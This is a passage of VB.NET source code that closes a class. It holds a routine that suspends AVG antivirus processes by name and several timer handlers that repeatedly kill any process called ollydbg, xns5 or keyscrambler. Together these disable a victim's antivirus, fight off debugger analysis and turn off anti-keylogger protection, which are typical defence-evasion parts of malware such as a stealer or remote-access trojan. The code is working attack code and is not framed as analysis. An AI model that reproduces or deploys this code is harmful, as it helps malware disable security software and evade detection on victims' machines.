        Dim game1, game2, game3, game4, game5, game6, game7, game8, game9 As Process()
        game1 = Process.GetProcessesByName("avgidsagent")
        game2 = Process.GetProcessesByName("avgfws")
        game3 = Process.GetProcessesByName("avgtray")
        game4 = Process.GetProcessesByName("avgemcx")
        game5 = Process.GetProcessesByName("avgwdsvc")
        game6 = Process.GetProcessesByName("avgnsx")
        game7 = Process.GetProcessesByName("avgcsrvx")
        game8 = Process.GetProcessesByName("avgrsx")
        game9 = Process.GetProcessesByName("ToolbarUpdater")
        Try
            SuspendProcess(game1(0))
            SuspendProcess(game2(0))
            SuspendProcess(game3(0))
            SuspendProcess(game4(0))
            SuspendProcess(game5(0))
            SuspendProcess(game6(0))
            SuspendProcess(game7(0))
            SuspendProcess(game8(0))
            SuspendProcess(game9(0))
        Catch ex As Exception

        End Try
    End Function

    Private Sub Timer15_Tick(sender As Object, e As EventArgs) Handles Timer15.Tick
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "ollydbg"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Private Sub Timer16_Tick(sender As Object, e As EventArgs) Handles Timer16.Tick
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "xns5"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Private Sub Timer17_Tick(sender As Object, e As EventArgs) Handles Timer17.Tick
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "keyscrambler"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub
End Class
